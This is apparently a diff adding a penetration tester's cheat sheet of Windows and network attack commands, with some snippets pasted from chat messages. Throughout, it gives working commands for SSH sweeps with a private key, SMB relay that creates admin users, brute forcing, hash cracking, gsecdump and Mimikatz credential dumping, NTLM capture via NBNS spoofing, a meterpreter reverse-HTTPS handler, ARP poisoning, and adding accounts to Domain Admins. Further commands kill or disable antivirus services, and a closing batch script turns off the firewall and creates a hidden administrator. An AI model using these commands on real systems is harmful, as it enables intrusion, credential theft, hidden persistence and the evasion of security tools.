@@ -1,0 +1,288 @@
+SSH - Disable 
+
+for a in $(cat ports/port.22) ; do ssh -i jenkins-private.key -o ConnectTimeout=5 -o UserKnownHostsFile=/dev/null -oKexAlgorithms=+diffie-hellman-group1-sha1 -o StrictHostKeyChecking=no -o BatchMode=yes  -oHostKeyAlgorithms=+ssh-dss jenkins@$a ; done
+for a in $(cat ports/port.22) ; do ssh -i jenkins-private.key \
+-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \
+-o BatchMode=yes -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+-oHostKeyAlgorithms=+ssh-dss jenkins@$a ; done
+
+Recon
+nmap -v -PE -A -oA ping-scan 10.0.0.0/16
+igrep Up ping-scan.gnmap | cut -d" " -f2 > active_ips.txt
+ 
+CLIENT=" "
+nmap -P0 -sC -iL networks.txt -oA $CLIENT-limited -A -sV --max-retries=3 --max-rtt-timeout=950ms -p 1433,2049,111,22,445,139,5900,3389,1521,21,23,80,443,623,5800,1502,6129,10000,8222,3128,3129,8080,8005,8100,6666,6667,9091,49152,23,3260,3306,5432,8443,9443
+#do a Ping
+nmap -sC -iL networks.txt -oA $CLIENT-limited -A -sV --max-retries=3 --max-rtt-timeout=950ms -p 1433,2049,111,22,445,139,5900,3389,1521,21,23,80,443,623,5800,1502,6129,10000,8222,3128,3129,8080,8005,8100,6666,6667,9091,49152,23,3260,3306,5432,8443,9443
+ 
+nmap -P0 -sC -iL networks.txt -oA $CLIENT-limited -sV --max-retries=3 --max-rtt-timeout=950ms -p 1433,2049,111,22,445,139,5900,3389,1521,21,80,443,623,5800,1502,6129,10000,8222,3128,3129,8080,6666,6667,9091,3306,49152,5432 ; grep "/open/" $CLIENT-limited.gnmap | cut -d" " -f2 > ips.txt ; nmap -A -sC -iL ips.txt -oA $CLIENT-top1k -sV --max-retries=3 --max-rtt-timeout=950ms
+ 
+nmap -A -sC -iL networks.txt -oA $CLIENT-top1k -sV --max-retries=3 --max-rtt-timeout=950ms
+nmap -P0 -sC -iL active_ips.txt -oA $CLIENT-limited -sV --max-retries=3 --max-rtt-timeout=950ms -p 1433,2049,111,22,445,139,5900,3389,1521,21,80,443,623,5800,1502,6129,10000,8222,3128,3129,8080,6666,6667,9091,49152,3306,5432
+
+SMBRelay
+/SMBRelay.py -i x.x.x.x -c 'net user msvertupdate msvertupdate /add && net localgroup administrators msvertupdate /add' -t y.y.y.y -u user1 user2 user3
+ 
+Enum4Linux
+cd
+ 
+Medusa
+medusa -e ns -M smbnt -O medusa.out -U ad-users -h ip.address
+ 
+Crack LmHash using rcacki_mt
+ /pentest/tools/password/rcracki/rcracki_mt -f hashes-1.txt -t 4 -o domain.cracked /pentest/tables/rti/lm_allspace/
+/pentest/tools/password/rcracki/rcracki_mt -f dump-dc01-l.txt -o dump-dc01-l.cracked -s dump-dc01.ses -k -m 2048 -v -t 12 /pentest/tables/rti/lm_allspace/ > dc_rcrack_mt.log 2>&amp;1
+ 
+Crack Challenge
+/pentest/tools/password/rcracki/rcracki_mt -t 4 -o cracked /pentest/tables/rti/lm_chal/ -h 16char
+./john-netntlm.pl --seed "PASSWORD" --file file.lc
+ 
+Domain admin add
+ net user IBMGSS Gl0balS3curity /add /domain
+ net user IBMGSS Gl0balS3curity /add /domain
+
+Screen
+screen -d -m -S shared
+ 
+Domain admin group add
+net group "Domain Admins" IBMGSS /add /domain
+net group "Enterprise Admins" IBMGSS /add /domain
+ 
+# Others
+net group "Remote Desktop Users" IBMGSS /add /domain
+net group "Desktop Admins" IBMGSS /add /domain
+net group "Network Admins" IBMGSS /add /domain
+net group "VMware Support" IBMGSS /add /domain
+net group "OSC ETL Admins" IBMGSS /add /domain
+net group "WebDir Admins" IBMGSS /add /domain
+ 
+# Make the user a local administrator
+net localgroup administrators IBMGSS /add
+ 
+# Account unlock
+net user [username] /active:yes [/domain]
+net user IBMGSS /active:yes /domain
+ 
+# Delete the tw account
+net user IBMGSS /delete /domain
+ 
+# Find a Domain Controller
+nmblookup -U <server> -R <domain>#1b
+dig any _kerberos._tcp.yourdomain.yourforest.com
+nslookup -type=srv _ldap._tcp.dc._msdcs.example.net
+ 
+# Find the arch
+wmic os get osarchitecture
+ 
+ver
+ 
+# List all hosts in the domain
+dsquery * domainroot -filter "&amp;(objectCategory=computer)" -attr name -l -limit 0
+ 
+ 
+# MS SQL
+# Scanner
+use scanner/mssql/mssql_login
+#Exploit mssql
+use windows/mssql/mssql_payload
+ 
+# PSExec
+use exploit/windows/smb/psexec
+ 
+ 
+# Gsecdump
+cd /
+ 
+upload /var/SpiderLabs/Win-Tools/gsecdump-Packed5.exe gsecdump-Packed5.exe
+ 
+shell
+ 
+gsecdump-Packed5.exe -a > gsec%COMPUTERNAME%.txt
+ 
+exit
+ 
+download gsec%COMPUTERNAME%.txt
+rm gsecdump-Packed5.exe
+rm gsec%COMPUTERNAME%.txt
+ 
+HOSTIP=`ifconfig eth0 |grep "inet addr" | cut -d: -f2| cut -d" " -f1`
+ 
+echo -e "setg LHOST $HOSTIP
+setg SRVHOST $HOSTIP
+setg SPOOFIP $HOSTIP" > nbns.rc
+ 
+cat >> nbns.rc << EOF
+use auxiliary/server/capture/smb
+set CAINPWFILE /root/smb-cain
+set JOHNPWFILE /root/smb-john
+set LOGFILE /root/smb-log
+run
+ 
+use auxiliary/server/capture/http_ntlm
+set JOHNPWFILE /root/http-ntlm-john
+set CAINPWFILE /root/http-ntlm-cain
+set SRVPORT 80
+set URIPATH /
+run
+ 
+use auxiliary/spoof/nbns/nbns_response
+run
+EOF
+ 
+msfconsole -r nbns.rc
+
+#how to use crackmapexec with MSF
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_https
+set LHOST 1.2.3.4
+set exitonsession false
+exploit -j
+
+crackmapexec TWC-Workstations-withadmin -u Administrator -p TWCds@dmin -M metinject -o LHOST=10.200.30.36 LPORT=8443
+ 
+# Mimikatz 2
+use kiwi 
+lsadump
+
+
+# Mimikatz 1 module
+load mimikatz
+
+msv
+mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::searchPasswords
+mimikatz_command -f sekurlsa::logonPasswords
+
+mimikatz_command -f hash::lm
+mimikatz_command -f hash::ntlm
+mimikatz_command -f system::user
+mimikatz_command -f system::computer
+mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::msv
+mimikatz_command -f service::list
+# Crypto -- First time will list the options for crypto
+mimikatz_command -f crypto::
+mimikatz_command -f crypto::listProviders
+mimikatz_command -f crypto::listStores
+mimikatz_command -f crypto::patchapi
+mimikatz_command -f crypto::exportCertificates CERT_STORE_NAME_HERE
+
+
+ 
+CDP: tcpdump -p -nn -v -i eth0 -s 1500 -c 1 &#39;ether[20:2] == 0x2000&#39;
+ 
+VRPT ettercap
+r=1 ; ettercap --log-msg ettercap-$r.log -T -q -w ettercap-$r.pcap -P smb_down -F LMHC_etter_tim.ef -M arp:remote -p -i eth0 /IP_GATEWAY/ //
+ 
+ 
+# Killing / disable Anti-Virus
+net stop "Kaspersky Anti-Virus Service"
+ 
+# Stop symantec
+net stop "Symantec Antivirus"
+ 
+ 
+taskkill /f /pid 1492
+ 
+# Trend Micro stop
+ 
+sc queryex tmpfw
+sc queryex tmproxy
+sc queryex tmlisten
+sc queryex ntrtscan
+ 
+taskkill /F /pid
+tmlisten
+ 
+taskkill /F /IM TmListen.exe
+ 
+taskkill /F /IM PccNTMon.exe
+ 
+taskkill /F /IM OfcPfwSvc.exe
+ 
+taskkill /F /IM NTRtScan.exe
+ 
+ 
+ 
+taskkill /F /IM TmListen.exe
+ 
+taskkill /F /IM NTRtScan.exe
+ 
+taskkill /F /IM TmProxy.exe
+ 
+taskkill /F /IM TmPfw.exe
+ 
+ 
+ 
+[6/13/14, 5:51:59 PM] Erich Newell:
+ 
+psexec \\127.0.0.1 -s sc config mcshield start= disabled
+psexec \\127.0.0.1 -s sc config McAfeeFramework start= disabled
+psexec \\127.0.0.1 -s sc config mfevtp start= disabled
+psexec \\127.0.0.1 -s sc config McTaskManager start= disabled
+psexec \\127.0.0.1 -s sc config McAfeeEngineService start= disabled
+sc config mcshield start= disabled
+sc config McAfeeFramework start= disabled
+sc config mfevtp start= disabled
+sc config McTaskManager start= disabled
+sc config McAfeeEngineService start= disabled
+ 
+ 
+[6/13/14, 5:52:19 PM] Erich Newell: Then:
+psexec \\127.0.0.1 -s sc stop mcshield
+psexec \\127.0.0.1 -s sc stop McAfeeFramework
+psexec \\127.0.0.1 -s sc stop mfevtp
+psexec \\127.0.0.1 -s sc stop McTaskManager
+psexec \\127.0.0.1 -s sc stop McAfeeEngineService
+ 
+sc stop mcshield
+sc stop McAfeeFramework
+sc stop mfevtp
+sc stop McTaskManager
+sc stop McAfeeEngineService
+ 
+ 
+ 
+ 
+START REMOTE DESKTOP
+ 
+[10/8/14, 3:45:46 PM] Ismail: netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+[10/8/14, 3:46:23 PM] Ismail: then
+[10/8/14, 3:46:25 PM] Ismail: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v UserAuthentication /t REG_DWORD /d 0
+[10/8/14, 3:46:28 PM] Ismail: reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+ 
+ 
+ 
+@echo off
+ 
+REM ****************
+REM Disable off "AUTO UPDATE"
+REM ****************
+sc config wuauserv start= disabled
+net stop wuauserv
+ 
+REM ****************
+REM Disable windows xp Firewall
+REM ****************
+netsh firewall set opmode disable
+ 
+REM ****************
+REM Enable TELNET
+REM ****************
+sc config tlntsvr start= auto
+net start telnet
+ 
+REM ****************
+REM Enable Remote Desktop
+REM ****************
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+ 
+REM ***************
+REM Create a HIDDEN USER usr= hack007, pass= dani
+REM ***************
+net user hacker007 dani /add
+net localgroup "Administrators" /add hacker007
+net localgroup "Users" /del hacker007
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker007 /t REG_DWORD /d 0 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
+
